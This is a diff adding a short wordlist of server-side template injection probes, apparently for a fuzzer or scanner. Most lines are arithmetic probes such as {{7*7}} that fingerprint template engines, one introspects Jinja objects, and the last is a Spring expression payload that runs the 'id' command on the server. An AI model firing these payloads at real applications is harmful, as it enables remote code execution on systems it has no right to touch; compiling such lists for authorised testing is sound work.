@@ -1,0 +1,11 @@
+{{7*7}}
+{{"7"*7}}
+#{7*7}
+#{'.'*77}
+${7*7}
+${"x"*7}
+{{request.application.__class__}}
+<%= 7*7 %>
+${{7*7}}
+{{ self }}
+${T(java.lang.Runtime).getRuntime().exec('id')}
